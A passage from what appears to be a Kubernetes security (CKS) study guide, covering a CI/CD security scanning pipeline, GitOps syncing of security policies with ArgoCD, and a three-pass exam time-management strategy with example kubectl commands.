  ├── k8s/rbac/          # Roles, RoleBindings, SAs
  ├── k8s/network/       # NetworkPolicies
  ├── k8s/pss/           # Namespace PSS labels
  ├── k8s/admission/     # OPA ConstraintTemplates, Kyverno policies
  ├── k8s/falco/         # Custom Falco rules (→ ConfigMap → Falco pod)
  ├── k8s/audit/         # Audit policy YAML
  └── .github/workflows/ # CI/CD security pipeline

35.2 Automating Security Scans in CI/CD (GitHub Actions)

# .github/workflows/security.yml
name: Security Pipeline
on: [pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: kube-linter
      run: kube-linter lint k8s/
    - name: kubesec scan
      run: kubesec scan k8s/deployment.yaml
    - name: Trivy scan
      run: trivy image --severity CRITICAL,HIGH --exit-code 1 anihpj:${{ github.sha }}
    - name: cosign sign
      if: github.event_name == 'push'
      run: cosign sign --key ${{ secrets.COSIGN_KEY }} anihpj:${{ github.sha }}

35.3 Policy as Code — Keeping Policies in Version Control

Store all policies in Git: OPA ConstraintTemplates, Kyverno ClusterPolicies, Falco rules (mounted as ConfigMap), Audit policy. ArgoCD syncs them to the cluster. Every policy change has a commit history, author, and PR review.

ArgoCD Application — Sync anihpj security policies from Git
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: {name: anihpj-security-policies, namespace: argocd}
spec:
  project: default
  source:
    repoURL: https://github.com/anihpj/security-policies
    targetRevision: main
    path: k8s/
    directory:
      recurse: true
  destination:
    server: https://kubernetes.default.svc
    namespace: anihpj-prod
  syncPolicy:
    automated:
      prune: true          # Remove resources not in Git
      selfHeal: true       # Auto-correct drift
    syncOptions:
    - CreateNamespace=true
📖 GitOps Security Benefits

With ArgoCD syncing security policies: (1) Every policy change has a Git commit + PR review + author, (2) If someone manually edits a NetworkPolicy on the cluster, ArgoCD auto-reverts it within 3 minutes, (3) Disaster recovery: rebuild the cluster, point ArgoCD at the same Git repo — all security policies are restored automatically.

Chapter 36: CKS Exam Strategy — Time Management & Approach

The CKS is a 2-hour, performance-based exam with ~15-20 hands-on tasks on a live terminal. You need an active CKA certification to take it. This chapter gives you the exam-day strategy that separates passing (67%) from failing.

🔴 Exam Prep⏱️ ~1 hour📖 Strategy🎯 CKS Exam

36.2 Time Management — The 3-Pass Strategy

⏱️ 120 Minutes — Break It Into 3 Passes
1 PASS 1 (0-45 min)
🟢 QUICK WINS

Scan ALL tasks, solve easy ones first (1-3 min each)

# 🟢 < 3 min each — FIRST:
kubectl create role r1 \
  --verb=get --resource=pods -n ns

kubectl create rolebinding rb1 \
  --role=r1 --sa=ns:sa

kubectl run test --image=nginx \
  --dry-run=client -o yaml

kubectl label ns <ns> \
  pod-security.kubernetes.io/enforce=restricted

kubectl auth can-i get pods \
  --as=system:serviceaccount:ns:sa
2 PASS 2 (45-105 min)
🟡 MEDIUM TASKS

Tackle moderate difficulty tasks (3-8 min each)

# 🟡 3-8 min each — SECOND:
kubectl apply -f netpol.yaml

vi /etc/falco/falco_rules.local.yaml
# Pod securityContext:
seccompProfile:
  type: RuntimeDefault
appArmorProfile:
  type: Localhost
  localhostProfile: my-profile
trivy image --severity CRITICAL \
  registry/image:tag

vi /etc/kubernetes/audit-policy.yaml
3 PASS 3 (105-120 min)
🔴 HARD + VERIFY

Complex tasks (8-15 min) + return to skipped + verify all

# 🔴 8-15 min each — LAST:
# Encryption at rest:
# EncryptionConfiguration →
# --encryption-provider-config flag

# OPA/Gatekeeper:
# ConstraintTemplate + Constraint
# → kubectl apply

# ImagePolicyWebhook:
# admission control config file

# 🔄 RETURN to skipped tasks!
# ✅ kubectl describe on all
# ⚠️ k config current-context!

Task Difficulty vs Time Allocation — Know Your Enemy

🎯 CKS Task Difficulty — Which to Tackle First
🟢 QUICK (< 3 min)

Do these FIRST

  • RBAC: Role + RoleBinding
  • Pod with securityContext
  • Namespace PSS labels
  • kubectl auth can-i
  • kubectl label ns for PSS

⏱️ Budget: 10-12 min

🟡 MEDIUM (3-8 min)

Do these SECOND

  • NetworkPolicy: deny + allow
  • Falco rule: custom rule
  • Seccomp/AppArmor profile
  • Trivy image scan + CVEs
  • Audit policy: config + enable
  • SA automount disabled

⏱️ Budget: 30-40 min

🔴 HARD (8-15 min)

Do these LAST

  • Encryption at rest + verify
  • OPA ConstraintTemplate
  • ImagePolicyWebhook config
  • Full IR scenario
  • Kyverno verifyImages

⏱️ Budget: 25-35 min

💡 STRATEGY REMINDERS
  • If stuck > 3 min on a quick task → skip and return later
  • If stuck > 8 min on medium → flag for Pass 3
  • Never spend > 15 min on any single task — partial credit is better than zero on the rest

36.3 Context Switching — The Most Important CKS Habit

Each task specifies a cluster context. Forgetting to switch = solving the right problem on the wrong cluster = 0 points.

# ALWAYS run FIRST for every task:
kubectl config use-context <context-from-task-description>

# Verify you're on the right cluster:
kubectl config current-context

# Pro tip: copy-paste the context command from the task description
🔴 The #1 CKS Exam Failure Reason

Candidates who score 50-65% almost always lost points on context switches — they solved tasks correctly but on the wrong cluster. The exam grader ONLY checks the cluster specified in the task. Always verify: kubectl config current-context before typing any other command.
